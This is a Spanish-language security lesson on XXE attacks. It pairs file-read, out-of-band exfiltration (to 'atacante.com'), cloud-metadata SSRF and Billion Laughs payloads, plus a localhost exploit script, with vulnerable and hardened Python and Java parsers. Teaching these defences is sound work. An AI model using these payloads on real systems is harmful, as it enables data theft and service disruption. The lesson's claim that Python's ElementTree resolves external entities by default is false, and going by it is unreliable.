# Clase 20: XXE - XML External Entities

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Comprender la estructura de XML, DTD y entidades XML
2. Identificar y explotar vulnerabilidades XXE en aplicaciones web
3. Diferenciar entre In-band XXE, Blind XXE y Error-based XXE
4. Implementar mitigaciones efectivas usando parseadores seguros

---

## Contenido Detallado

### 1. Que es XML?

XML (eXtensible Markup Language) es un lenguaje de marcado que define reglas para codificar documentos en formato legible por humanos y maquinas.

#### Estructura Basica de XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<usuarios>
    <usuario id="1">
        <nombre>Juan Perez</nombre>
        <email>juan@example.com</email>
        <rol>admin</rol>
    </usuario>
    <usuario id="2">
        <nombre>Maria Garcia</nombre>
        <email>maria@example.com</email>
        <rol>user</rol>
    </usuario>
</usuarios>
```

#### DTD (Document Type Definition)

Un DTD define la estructura legal de un documento XML. Se declara dentro del documento o externamente.

```xml
<?xml version="1.0"?>
<!DOCTYPE usuarios [
    <!ELEMENT usuarios (usuario+)>
    <!ELEMENT usuario (nombre, email, rol)>
    <!ATTLIST usuario id CDATA #REQUIRED>
    <!ELEMENT nombre (#PCDATA)>
    <!ELEMENT email (#PCDATA)>
    <!ELEMENT rol (#PCDATA)>
]>
<usuarios>
    <usuario id="1">
        <nombre>Juan</nombre>
        <email>juan@test.com</email>
        <rol>admin</rol>
    </usuario>
</usuarios>
```

#### Entidades XML

Las entidades son variables que representan datos. Pueden ser internas, externas o predefinidas.

**Entidades predefinidas:**
- `&lt;` = <
- `&gt;` = >
- `&amp;` = &
- `&apos;` = '
- `&quot;` = "

**Entidades internas (definidas en el DTD):**
```xml
<!DOCTYPE foo [
    <!ENTITY nombre "Juan Perez">
]>
<datos>&nombre;</datos>
```

**Entidades externas (la clave del ataque XXE):**
```xml
<!DOCTYPE foo [
    <!ENTITY ext SYSTEM "file:///c:/windows/win.ini">
]>
<datos>&ext;</datos>
```

### 2. Ataque XXE (XML External Entity)

XXE ocurre cuando un parser XML procesa entidades externas de fuentes no confiables, permitiendo al atacante leer archivos del servidor, hacer SSRF o causar DoS.

#### Impacto de XXE

| Impacto | Descripcion |
|---------|------------|
| **Lectura de archivos** | Leer /etc/passwd, archivos de configuracion, codigo fuente |
| **SSRF** | Hacer peticiones HTTP a sistemas internos (nube, bases de datos) |
| **DoS (Billion Laughs)** | Expandir entidades recursivas hasta agotar memoria |
| **RCE** | En casos especificos con PHP expect module o protocolos especiales |

#### Variantes de XXE

**In-band XXE:** El resultado se devuelve directamente en la respuesta del servidor.

**Blind XXE:** No se ve el resultado directamente. Se usa out-of-band (OOB) mediante DNS/HTTP.

**Error-based XXE:** Se induce un error que revela el contenido del archivo en el mensaje de error.

### 3. In-band XXE - Lectura de Archivos

```xml
<!-- Payload para leer /etc/passwd (o c:/windows/win.ini en Windows) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
    <nombre>&xxe;</nombre>
</root>
```

### 4. Blind XXE con Exfiltracion Out-of-Band

```xml
<!-- Payload para exfiltrar datos via HTTP a servidor del atacante -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://atacante.com/?data=%file;'>">
    %eval;
    %exfil;
]>
```

### 5. XXE a SSRF (Server-Side Request Forgery)

```xml
<!-- Payload para acceder a servicios internos -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <datos>&xxe;</datos>
</root>
```

### 6. Billion Laughs Attack (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
<!-- Se expande exponencialmente: ~3GB de memoria -->
```

### 7. Codigo Vulnerable en Python

```python
"""
vulnerable_xml_parser.py - App vulnerable a XXE
"""
from flask import Flask, request, jsonify
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/api/xml', methods=['POST'])
def parse_xml():
    xml_data = request.data

    try:
        root = ET.fromstring(xml_data)
        # Extraer contenido de la etiqueta <nombre>
        nombre = root.find('nombre').text if root.find('nombre') is not None else ''
        return jsonify({'nombre': nombre, 'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

**Problema:** `xml.etree.ElementTree` tiene DTD habilitado por defecto y procesa entidades externas.

### 8. Codigo Vulnerable en Java

```java
// XMLParserServlet.java - vulnerable
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.StringReader;
import javax.xml.parsers.*;
import org.xml.sax.InputSource;

public class XMLParserServlet {
    public String parseXml(String xmlString) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(xmlString)));
        return doc.getDocumentElement().getTextContent();
    }
}
```

### 9. Mitigaciones

#### Deshabilitar DTD y Entidades Externas en Python

```python
from defusedxml import ElementTree as safe_ET

# defusedxml es un wrapper seguro que bloquea XXE
root = safe_ET.fromstring(xml_data)  # Levanta excepcion si hay XXE
```

#### Deshabilitar DTD y Entidades Externas en Java

```java
public class SafeXMLParser {
    public static Document parse(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Deshabilitar DTD completamente
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // Alternativa: deshabilitar solo entidades externas
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // Deshabilitar carga de DTD externo
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Deshabilitar XInclude
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new InputSource(new StringReader(xml)));
    }
}
```

#### Resumen de Mitigaciones

| Medida | Descripcion |
|--------|------------|
| Deshabilitar DTD | `disallow-doctype-decl: true` (Java), usar `defusedxml` (Python) |
| Deshabilitar entidades externas | `external-general-entities: false`, `external-parameter-entities: false` |
| Usar formatos alternativos | JSON en vez de XML cuando sea posible |
| Validar contenido | Whitelist de caracteres permitidos |
| Actualizar librerias | Versiones recientes tienen configuraciones mas seguras |
| WAF/Input validation | Filtrar keywords como `<!ENTITY`, `SYSTEM`, `PUBLIC` |

---

## Ejercicio 1: Explotar y Mitigar XXE en Python

### Escenario

Tienes una aplicacion Flask que parsea XML. Debes explotar la vulnerabilidad XXE para leer un archivo local y luego corregirla usando `defusedxml`.

**Paso 1: Crear el servidor vulnerable**

```python
"""
server_vulnerable.py - Servidor vulnerable a XXE
"""
from flask import Flask, request, jsonify
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/api/upload', methods=['POST'])
def upload_xml():
    xml_data = request.data
    try:
        root = ET.fromstring(xml_data)
        content = root.find('data').text if root.find('data') is not None else ''
        return jsonify({'content': content})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

**Paso 2: Crear script de explotacion**

```python
"""
exploit_xxe.py - Explotacion de XXE
"""
import requests

# Payload para leer archivo de Windows
payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
    <data>&xxe;</data>
</root>"""

url = "http://127.0.0.1:5000/api/upload"
response = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'})

print("=== RESPUESTA DEL SERVIDOR ===")
print(response.text)

# Si funciona, veremos el contenido de win.ini
# Si no funciona, veremos un mensaje de error
```

**Paso 3: Ejecutar la explotacion**

```bash
# Terminal 1: Iniciar el servidor
python server_vulnerable.py

# Terminal 2: Ejecutar el exploit
python exploit_xxe.py
```

**Paso 4: Version corregida con defusedxml**

```python
"""
server_seguro.py - Servidor seguro contra XXE
"""
from flask import Flask, request, jsonify
from defusedxml import ElementTree as safe_ET

app = Flask(__name__)

@app.route('/api/upload', methods=['POST'])
def upload_xml():
    xml_data = request.data
    try:
        # defusedxml bloquea automaticamente entidades externas
        root = safe_ET.fromstring(xml_data)
        content = root.find('data').text if root.find('data') is not None else ''
        return jsonify({'content': content})
    except Exception as e:
        return jsonify({'error': f'Error parseando XML: {str(e)}'}), 400

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

**Paso 5: Verificar que la mitigacion funciona**

Ejecutar el exploit `exploit_xxe.py` contra `server_seguro.py`. Ahora debe fallar porque defusedxml rechaza las entidades externas.

**Instalacion de dependencias:**

```bash
pip install flask requests defusedxml
```

---

## Ejercicio 2: Parser Java Seguro contra XXE

### Escenario

Tienes un servicio Java que recibe XML de clientes. Debes configurar correctamente el parser para bloquear XXE.

**Codigo vulnerable original:**

```java
// VulnerableXMLParser.java
import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;

public class VulnerableXMLParser {

    public String parseXML(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
        return doc.getDocumentElement().getTextContent();
    }

    public static void main(String[] args) throws Exception {
        VulnerableXMLParser parser = new VulnerableXMLParser();

        // XML malicioso con XXE
        String maliciousXML = "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE foo ["
            + "  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
            + "]>"
            + "<root><data>&xxe;</data></root>";

        String result = parser.parseXML(maliciousXML);
        System.out.println("Resultado: " + result);
    }
}
```

**Codigo corregido (seguro):**

```java
// SafeXMLParser.java
import javax.xml.parsers.*;
import javax.xml.XMLConstants;
import org.w3c.dom.*;
import org.xml.sax.*;
import java.io.*;

public class SafeXMLParser {

    public String parseXML(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // === CONFIGURACIONES DE SEGURIDAD ===

        // 1. Deshabilitar completamente DTD (recomendado si no se necesita)
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 2. Deshabilitar entidades externas generales
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // 3. Deshabilitar entidades externas de parametro
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 4. Deshabilitar carga de DTD externo
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // 5. Deshabilitar XInclude
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        // 6. Configurar constantes de seguridad de JAXP (Java 8u121+)
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        // 7. Establecer limite de acceso de estilo (style sheet)
        try {
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        } catch (IllegalArgumentException e) {
            // No todos los factories soportan estos atributos
        }

        DocumentBuilder builder = factory.newDocumentBuilder();

        // Configurar un manejador de errores personalizado
        builder.setErrorHandler(new ErrorHandler() {
            @Override
            public void warning(SAXParseException e) {
                System.out.println("Warning: " + e.getMessage());
            }
            @Override
            public void error(SAXParseException e) {
                System.out.println("Error: " + e.getMessage());
            }
            @Override
            public void fatalError(SAXParseException e) throws SAXException {
                throw new SAXException("Error fatal parseando XML: " + e.getMessage());
            }
        });

        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
        return doc.getDocumentElement().getTextContent();
    }

    public static void main(String[] args) {
        SafeXMLParser parser = new SafeXMLParser();

        // Prueba 1: XML malicioso con XXE
        String maliciousXML = "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE foo ["
            + "  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
            + "]>"
            + "<root><data>&xxe;</data></root>";

        try {
            String result = parser.parseXML(maliciousXML);
            System.out.println("Resultado: " + result);
        } catch (Exception e) {
            System.out.println("BLOQUEADO - Ataque XXE detectado: " + e.getMessage());
        }

        // Prueba 2: XML legitimo debe funcionar
        String legitXML = "<root><data>Hola mundo</data></root>";
        try {
            String result = parser.parseXML(legitXML);
            System.out.println("XML legitimo procesado: " + result);
        } catch (Exception e) {
            System.out.println("Error con XML legitimo: " + e.getMessage());
        }
    }
}
```

**Compilar y ejecutar:**

```bash
javac SafeXMLParser.java
java SafeXMLParser
```

---

## Ejercicio 3: Detectar y Clasificar Variantes de XXE

Dados los siguientes fragmentos de codigo, identificar que tipo de XXE representa cada uno y que impacto tendria.

**Caso A:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<root>&xxe;</root>
```

**Caso B:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://atacante.com/evil.dtd">
    %dtd;
]>
<root>&send;</root>
```

**Caso C:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

**Solucion:**

| Caso | Tipo | Impacto | Explicacion |
|------|------|---------|-------------|
| A | In-band XXE + SSRF | Acceso a metadata de instancia AWS (credentials IAM) | La entidad apunta a la IP interna de AWS metadata service (169.254.169.254) y el resultado se ve en la respuesta |
| B | Blind XXE (OOB) | Exfiltracion de /etc/passwd a servidor del atacante | Usa DTD externo para enviar datos via HTTP; el resultado no se ve en la respuesta directa |
| C | DoS (Billion Laughs) | Agotamiento de memoria del servidor | Entidades anidadas que se expanden exponencialmente (1000+ expansiones) |

---

## Preguntas y Respuestas

### Pregunta 1
**Que diferencia hay entre entidades XML internas y externas? Cual es la base del ataque XXE?**

**Respuesta:** Las entidades internas definen contenido directamente en el DTD (`<!ENTITY nombre "valor">`), mientras que las entidades externas cargan contenido desde una fuente externa usando `SYSTEM` o `PUBLIC` (`<!ENTITY ext SYSTEM "URL">`). La base del ataque XXE es que el parser XML, al expandir una entidad externa, accede a recursos del servidor (archivos locales, URLs internas) que el atacante no deberia poder leer.

### Pregunta 2
**Como se diferencia un ataque XXE In-band de uno Blind XXE?**

**Respuesta:** En el XXE In-band (o clasico), el contenido del archivo leido se devuelve directamente en la respuesta HTTP del servidor, por lo que el atacante ve el resultado inmediatamente. En Blind XXE, el servidor no devuelve el contenido en la respuesta. El atacante debe usar tecnicas out-of-band (OOB), como hacer que el servidor envie el contenido a un servidor controlado por el atacante via HTTP, FTP o DNS. Blind XXE es mas complejo pero tambien evade detecciones basicas.

### Pregunta 3
**Por que defusedxml es seguro y xml.etree.ElementTree no lo es?**

**Respuesta:** `xml.etree.ElementTree` de la biblioteca estandar de Python procesa DTD y entidades externas por defecto, permitiendo XXE. `defusedxml` es un wrapper que protege contra: (1) entidades externas (XXE), (2) Billion Laughs (DoS por expansion de entidades), (3) expansion de entidades cuadratica, (4) compression bombs (bombs.zip). Lo hace estableciendo limites estrictos en la expansion de entidades y rechazando entidades externas. Ademas, `defusedxml` mantiene la misma API que ElementTree, por lo que el cambio es minimo: solo importar `from defusedxml import ElementTree as ET`.

### Pregunta 4
**Que es SSRF y como se relaciona con XXE?**

**Respuesta:** SSRF (Server-Side Request Forgery) ocurre cuando un atacante hace que el servidor realice peticiones HTTP a destinos internos. En XXE, el atacante define una entidad externa que apunta a una URL interna (ej: `http://169.254.169.254/` para metadata de AWS, `http://localhost:9200/` para Elasticsearch, `http://admin:admin@localhost:8080/` para admin panels internos). El parser XML, al expandir la entidad, hace la peticion desde el servidor, permitiendo al atacante sortear firewalls y acceder a sistemas que no deberian ser accesibles desde internet.

### Pregunta 5
**Cual es la mitigacion mas efectiva contra XXE? Debe deshabilitarse todo el soporte DTD?**

**Respuesta:** La mitigacion mas efectiva es deshabilitar completamente el procesamiento de DTD si la aplicacion no lo necesita (`disallow-doctype-decl: true`). Si la aplicacion requiere DTD por razones de negocio (esquemas XML, validacion), se deben deshabilitar al menos las entidades externas generales y de parametro. En Python, la opcion mas simple es usar `defusedxml`. En Java, configurar las features de DocumentBuilderFactory. La regla de oro: si no necesitas DTD, deshabilitalo completamente. Si lo necesitas, reduce al minimo las capacidades de DTD y valida estrictamente el input.

### Pregunta 6
**Es posible hacer XXE en JSON o solo en XML?**

**Respuesta:** XXE es especifico de XML porque solo XML tiene DTD y entidades externas. Sin embargo, algunas aplicaciones aceptan XML aunque la API principal use JSON (por ejemplo, servicios SOAP, procesamiento de documentos Office (OOXML), SVG, RSS/Atom feeds). Ademas, ataque similares existen en otros formatos: JSON injection, YAML deserialization con `!!` tags. Siempre que la aplicacion procese XML en alguna capa (log4j con XML layout, JMS con mensajes XML, SAML), hay riesgo de XXE.

### Pregunta 7
**Como se protege contra Billion Laughs attack ademas de deshabilitar DTD?**

**Respuesta:** Ademas de deshabilitar DTD, se pueden establecer limites en el parser: (1) limite de profundidad de entidades anidadas, (2) limite de expansion total de entidades (ej: `entity_expansion_limit` en libxml2), (3) limite de tamaño maximo del documento XML, (4) timeout de parseo. En Python con `defusedxml`, estos limites ya vienen configurados por defecto. En Java, usar `XMLConstants.FEATURE_SECURE_PROCESSING` establece limites conservadores de expansion.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP XXE Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
2. **Leer:** OWASP XML Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
3. **Practicar:** PortSwigger Web Security Academy - XXE labs: https://portswigger.net/web-security/xxe
4. **Experimentar:** Configurar un servidor Flask que acepte XML y probar payloads XXE en un entorno controlado
5. **Leer:** Documentacion de defusedxml - https://pypi.org/project/defusedxml/
6. **Profundizar:** Investigar el ataque XXE en el contexto de Office Open XML (archivos .docx, .xlsx que son ZIP con XML dentro)



